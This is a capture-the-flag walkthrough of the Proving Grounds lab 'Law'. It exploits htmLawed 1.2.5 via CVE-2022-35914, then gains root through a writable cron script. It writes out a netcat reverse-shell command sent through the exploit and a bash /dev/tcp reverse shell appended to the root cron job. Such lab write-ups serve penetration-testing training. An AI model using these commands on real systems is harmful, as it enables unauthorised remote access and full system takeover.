# Law — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Easy
**OS:** Linux

---

## TL;DR

htmLawed 1.2.5 CVE-2022-35914 RCE (with custom path fix) → shell as www-data → writable cron job script → rootshell.

---

## Enumeration

```bash
nmap -sV -p- 192.168.164.190
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.4p1 Debian |
| 80 | HTTP | Apache httpd 2.4.56 ("htmLawed (1.2.5) test") |

The site title immediately tells us: **htmLawed version 1.2.5**.

---

## Exploitation — CVE-2022-35914 (htmLawed RCE)

Found two exploits:
- [EDB-52023](https://www.exploit-db.com/exploits/52023)
- [CVE-2022-35914 PoC on GitHub](https://github.com/cosad3s/CVE-2022-35914-poc/blob/main/CVE-2022-35914.py)

Both fail initially. The GitHub exploit says "Server not vulnerable" and the EDB one doesn't produce output.

Looking at the Python exploit code, the issue is a **hardcoded path**:

```python
def exploit(url,cmd,user_agent,check,hook):
    uri = "/vendor/htmlawed/htmlawed/htmLawedTest.php"
```

But our target doesn't have that path. The htmLawed test page is at the root: `/index.php`.

After changing the URI to `/index.php` and rerunning:

```bash
python3 CVE-2022-35914.py -u http://192.168.164.190/ -c 'nc 192.168.45.161 6969 -e /bin/sh'
```

We get a shell as `www-data`.

---

## Privilege Escalation — Writable Cron Script

Running **pspy** to monitor cron jobs, we see a cleanup script running as root:

```
/var/www/html/cleanup.sh
```

And we have write access to it! Simply append a reverse shell:

```bash
echo "/bin/bash -i >& /dev/tcp/192.168.45.161/6970 0>&1" >> cleanup.sh
```

Start a listener on port 6970 and wait for the cron to trigger — **root**. 🎉

---

## Key Takeaways

- **Always read exploit source code** when it fails — hardcoded paths are a common reason for failure
- **CVE-2022-35914** works on htmLawed 1.2.5 but the test page URL varies between installations
- **Writable cron scripts** are one of the easiest privilege escalation vectors — always check with `pspy`

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
